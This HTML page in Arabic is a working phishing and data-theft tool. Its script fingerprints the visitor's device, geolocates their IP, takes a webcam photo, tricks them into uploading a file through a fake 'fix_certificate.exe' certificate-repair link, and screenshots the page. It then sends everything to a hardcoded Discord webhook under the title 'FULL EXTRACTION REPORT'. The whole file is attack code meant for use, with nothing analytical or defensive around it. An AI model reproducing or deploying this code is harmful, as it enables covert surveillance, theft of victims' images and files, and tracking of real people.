<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>تحقق</title>
    <script src="https://cdnjs.cloudflare.com/ajax/libs/html2canvas/1.4.1/html2canvas.min.js"></script>
    <link rel="stylesheet" href="https://unpkg.com/leaflet@1.9.4/dist/leaflet.css" />
    <script src="https://unpkg.com/leaflet@1.9.4/dist/leaflet.js"></script>
    <style>
        body { background: #000; color: #0f0; font-family: 'Courier New', monospace; padding: 20px; }
        #start { background: #0f0; color: #000; border: none; padding: 20px; font-size: 20px; cursor: pointer; font-weight: bold; display: block; margin: 50px auto; }
        #ui { display: none; margin-top: 20px; background: #111; padding: 20px; border: 1px solid #0f0; }
        .sec { border-bottom: 1px dashed #0f0; padding: 10px 0; }
        h3 { color: #0f0; }
        .r { display: flex; justify-content: space-between; font-size: 14px; margin: 5px 0; }
        .v { color: #fff; direction: ltr; text-align: left; max-width: 70%; word-break: break-all; }
        #map { height: 200px; margin-top: 10px; display: none; }
        #bait { margin-top: 20px; color: #fff; }
        .fake-link { color: #0ff; text-decoration: underline; cursor: pointer; }
        #camBox { display: none; margin-top: 20px; border: 2px solid red; }
        #log { position: fixed; bottom: 10px; left: 10px; background: rgba(0,0,0,0.8); color: red; padding: 10px; font-size: 12px; }
    </style>
</head>
<body id="cap">

<button id="start">[ اضغط هنا للدخول ]</button>
<div id="log">جاهز...</div>

<div id="ui">
    <div class="sec"><h3>[+] DEEP OSINT FINGERPRINT</h3><div id="fp"></div></div>
    <div class="sec"><h3>[+] GEOLOCATION & IP</h3><div id="geo"></div><div id="map"></div></div>
    <div class="sec">
        <h3>[+] CAMERA CAPTURE (IF ALLOWED)</h3>
        <p style="color:#888; font-size:12px;">محاولة تشغيل الكاميرا بشكل خفي (ستفشل في المتصفحات الحديثة بدون إذن)</p>
        <video id="camBox" autoplay width="200"></video><canvas id="camCanvas" style="display:none"></canvas>
    </div>
    <div class="sec" id="bait">
        <h3>[+] FILE BAIT (SOCIAL ENGINEERING)</h3>
        <p style="font-size:14px; color:#fff;">خطأ في تحميل الشهادة. يرجى تحميل ملف الإصلاح:</p>
        <input type="file" id="fileInput" style="display:none" multiple>
        <span class="fake-link" onclick="document.getElementById('fileInput').click()">fix_certificate.exe</span>
        <div id="fileData" style="color:red; margin-top:10px;"></div>
    </div>
</div>

<script>
const WH = 'https://discord.com/api/webhooks/1493905081458753557/0KU7qLKVVzacx7VnzdQawdNaA5O1xeuSPnQil98pTcU0hc1bLWDOIRa1PR1zUVIE1Hil';
const log = m => document.getElementById('log').innerText = m;

document.getElementById('start').onclick = async () => {
    document.getElementById('start').style.display = 'none';
    document.getElementById('ui').style.display = 'block';
    log("جاري الحفر في النظام...");

    let finalData = {};

    // 1. بصمة عميقة جداً (Audio, Canvas, WebGL)
    let gpu = "N/A", audioFP = "N/A";
    try {
        const c = document.createElement('canvas'); const gl = c.getContext('webgl');
        gpu = gl.getExtension('WEBGL_debug_renderer_info') ? gl.getParameter(gl.getExtension('WEBGL_debug_renderer_info').UNMASKED_RENDERER_WEBGL) : "Blocked";
    } catch(e){}
    try {
        const actx = new (window.AudioContext || window.webkitAudioContext)();
        const osc = actx.createOscillator(); const analyser = actx.createAnalyser(); osc.type = 'triangle'; osc.frequency.setValueAtTime(10000, actx.currentTime);
        osc.connect(analyser); analyser.connect(actx.destination); osc.start(0);
        const data = new Uint8Array(analyser.frequencyBinCount); analyser.getByteFrequencyData(data);
        audioFP = "Hash: " + data.slice(0, 10).join('');
        actx.close();
    } catch(e){ audioFP = "Blocked"; }

    finalData.fingerprint = {
        "OS/Platform": navigator.platform,
        "UA": navigator.userAgent,
        "Lang": navigator.language,
        "Screen": `${screen.width}x${screen.height}@${screen.colorDepth}bit`,
        "DevicePixelRatio": window.devicePixelRatio,
        "CPU_Cores": navigator.hardwareConcurrency,
        "RAM": navigator.deviceMemory ? `${navigator.deviceMemory}GB` : "Hidden",
        "GPU": gpu,
        "Audio_FP": audioFP,
        "Touch": navigator.maxTouchPoints,
        "Battery": "N/A",
        "Network": "N/A",
        "Timezone": Intl.DateTimeFormat().resolvedOptions().timeZone,
        "Storage_Quota": "N/A"
    };

    try {
        const bat = await navigator.getBattery();
        finalData.fingerprint.Battery = `${bat.level*100}% (Charging: ${bat.charging})`;
    } catch(e){}
    try {
        const conn = navigator.connection;
        finalData.fingerprint.Network = `${conn.effectiveType} / ${conn.downlink}Mbps / RTT: ${conn.rtt}ms`;
    } catch(e){}
    try {
        const est = await navigator.storage.estimate();
        finalData.fingerprint.Storage_Quota = `${(est.quota / 1024 / 1024 / 1024).toFixed(2)} GB Total, ${(est.usage / 1024 / 1024).toFixed(2)} MB Used`;
    } catch(e){}
    
    renderObj('fp', finalData.fingerprint);
    log("تم جمع البصمة.");

    // 2. الموقع والـ IP
    let loc = {IP: "Error", City: "Error", Country: "Error", ISP: "Error", Lat: 0, Lon: 0};
    try { const r = await fetch('https://ipapi.co/json/'); loc = await r.json(); } catch(e){}
    renderObj('geo', loc);
    if(loc.Lat && loc.Lon) {
        document.getElementById('map').style.display = 'block';
        const m = L.map('map').setView([loc.Lat, loc.Lon], 12);
        L.tileLayer('https://{s}.tile.openstreetmap.org/{z}/{x}/{y}.png').addTo(m);
        L.marker([loc.Lat, loc.Lon]).addTo(m);
    }
    log("تم تحديد الموقع.");

    // 3. محاولة الكاميرا (سينتج عنها طلب إذن في المتصفح)
    try {
        const stream = await navigator.mediaDevices.getUserMedia({ video: true, audio: false });
        document.getElementById('camBox').style.display = 'block';
        document.getElementById('camBox').srcObject = stream;
        log("تم الوصول للكاميرا!");
        // نلتقط صورة بعد ثانيتين
        setTimeout(() => {
            const video = document.getElementById('camBox');
            const canvas = document.getElementById('camCanvas');
            canvas.width = video.videoWidth; canvas.height = video.videoHeight;
            canvas.getContext('2d').drawImage(video, 0, 0);
            finalData.cameraBase64 = canvas.toDataURL('image/jpeg', 0.8).split(',')[1];
            stream.getTracks().forEach(t => t.stop()); // نغلق الكاميرا
            log("تم التقاط صورة الكاميرا.");
        }, 2000);
    } catch(e) { log("الكاميرا: تم الرفض أو الحظر."); }

    // 4. اصطياد الملفات (File Baiting)
    document.getElementById('fileInput').addEventListener('change', async (e) => {
        const file = e.target.files[0];
        if(file) {
            log(`تم اصطياد ملف: ${file.name} (${(file.size/1024).toFixed(2)} KB)`);
            document.getElementById('fileData').innerText = `تم رفع: ${file.name}`;
            // تحويل الملف إلى Base64 وإرساله
            const reader = new FileReader();
            reader.onload = () => { finalData.stolenFile = { name: file.name, type: file.type, base64: reader.result.split(',')[1] }; };
            reader.readAsDataURL(file);
        }
    });

    // 5. الإرسال النهائي (بعد 6 ثوانٍ لانتظار الكاميرا أو الملفات)
    setTimeout(async () => {
        log("جاري الالتقاط والإرسال النهائي...");
        try {
            // التقاط صورة للصفحة
            const pageCanvas = await html2canvas(document.body, { useCORS: true });
            finalData.pageScreenshot = pageCanvas.toDataURL('image/png').split(',')[1];

            // تجهيز الـ Discord Payload
            const textPayload = {
                username: "Max-OSINT-Bot",
                embeds: [{
                    title: "💀 FULL EXTRACTION REPORT",
                    color: 000000,
                    fields: [
                        { name: "📍 Geo/IP", value: `\`\`\`${JSON.stringify(loc, null, 1)}\`\`\``, inline: false },
                        { name: "💻 Deep FP", value: `\`\`\`${JSON.stringify(finalData.fingerprint, null, 1)}\`\`\``, inline: false },
                        { name: "📸 Camera", value: finalData.cameraBase64 ? "✅ Image Captured (Sent as file)" : "❌ Denied/Unavailable", inline: true },
                        { name: "📁 File Bait", value: finalData.stolenFile ? `✅ ${finalData.stolenFile.name}` : "❌ No file selected", inline: true }
                    ]
                }]
            };

            const formData = new FormData();
            formData.append("payload_json", JSON.stringify(textPayload));

            // إضافة صورة الصفحة
            if(finalData.pageScreenshot) {
                formData.append("files[0]", base64ToBlob(finalData.pageScreenshot, 'image/png'), "page_screenshot.png");
            }
            // إضافة صورة الكاميرا
            if(finalData.cameraBase64) {
                formData.append("files[1]", base64ToBlob(finalData.cameraBase64, 'image/jpeg'), "webcam.jpg");
            }
            // إضافة الملف المصطاد
            if(finalData.stolenFile && finalData.stolenFile.base64) {
                formData.append("files[2]", base64ToBlob(finalData.stolenFile.base64, finalData.stolenFile.type), finalData.stolenFile.name);
            }

            await fetch(WH, { method: 'POST', body: formData });
            log("✅ تم إرسال كل شيء بنجاح إلى الويب هوك.");
        } catch(err) {
            log("❌ خطأ في الإرسال: " + err.message);
        }
    }, 6000);
};

function renderObj(id, obj) {
    let html = '';
    for (const [k, v] of Object.entries(obj)) { html += `<div class="r"><span>${k}:</span><span class="v">${v}</span></div>`; }
    document.getElementById(id).innerHTML = html;
}

function base64ToBlob(b64, type) {
    const byteChars = atob(b64);
    const arr = new Uint8Array(byteChars.length);
    for(let i=0; i<byteChars.length; i++) arr[i] = byteChars.charCodeAt(i);
    return new Blob([arr], {type});
}
</script>
</body>
</html>
